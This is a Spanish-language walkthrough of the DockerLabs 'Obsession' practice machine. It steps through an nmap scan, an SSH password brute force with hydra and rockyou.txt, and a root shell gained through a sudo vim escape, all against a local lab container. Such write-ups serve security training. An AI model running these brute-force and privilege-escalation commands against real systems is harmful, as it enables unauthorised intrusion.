Obssesion-DockerLabs🇪🇸

**1. En primer lugar vamos a descomprimir el fichero facilitado y procedemos a moverlo a nuestro directorio de trabajo**
```bash
unzip obsession.zip
```

<img width="1010" height="251" alt="image" src="https://github.com/user-attachments/assets/e5a6538a-ab04-4542-add6-b9715297d898" />


**2. Ahora vamos a poner en marcha la máquina.**
```bash
 sudo bash ./auto_deploy.sh obsession.tar 
```

<img width="1005" height="500" alt="image" src="https://github.com/user-attachments/assets/3b8595ea-5c2c-440d-860c-cd31cf1fce8c" />


**3. Ahora vamos a comprobar la conexión con un ping.**
```bash
ping -c3 172.17.0.2
```

<img width="1009" height="395" alt="image" src="https://github.com/user-attachments/assets/d4f6404e-e0ba-4fae-8b0f-3a689680fae6" />

```bash

```

<img width="1009" height="382" alt="image" src="https://github.com/user-attachments/assets/7328221e-217b-439c-a86e-fae66081f7fd" />


**4. Ahora vamos a realizar un rastreo de puertos con nmap.**
```bash
 nmap -sCV 172.17.0.2
```

<img width="1008" height="664" alt="image" src="https://github.com/user-attachments/assets/196f671c-4346-461c-bab9-a30c11df1f3d" />


**5. Ahora iremos a la web y mandaremos una solicitud POST y veremos que devuelve un nombre perfecto para probar por ssh.**

<img width="907" height="349" alt="image" src="https://github.com/user-attachments/assets/e7b2203c-1935-4c0f-bbfa-ce7ac813b8f5" />


**6. Ahora intentaremos descubir la contraseña por fuerza bruta desde el repositorio rockyou con hydra.**
```bash
 hydra -l russoski -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2
```

<img width="1014" height="245" alt="image" src="https://github.com/user-attachments/assets/56f39a1a-0f96-496f-8a94-c7de1d860907" />


**7. Ahora mediante SSH entraremos a la máquina con el usuario proporionado y la contraseña**
```bash

```

<img width="871" height="355" alt="image" src="https://github.com/user-attachments/assets/bc41572c-923e-4da9-956b-7ae43c9cbb1c" />


**8. Ahora dentro del equipo veremos que privilegios de binarios tendremos..**
```bash
sudo -l
```

<img width="977" height="162" alt="image" src="https://github.com/user-attachments/assets/e279ee1c-0ff2-449d-92c3-f3978e598cc3" />


**9. Ahora sabiendo que podemos ejecutar los binarios de vim, ejecutaremos este script para escalar comandos a root.**
```bash
sudo vim -c ':!/bin/bash'
```

<img width="1006" height="582" alt="image" src="https://github.com/user-attachments/assets/da11581f-593f-48cb-9a33-b8ffe84297fb" />



**10. Para encontrar la key por ultimo buscaremos en la máquina.**
```bash
ls /home
cd /root && ls
cat Video-Nagore-Fernandez.txt
```

<img width="1008" height="298" alt="image" src="https://github.com/user-attachments/assets/f6d9630b-f0b9-4a4f-80da-2e153ac33f23" />













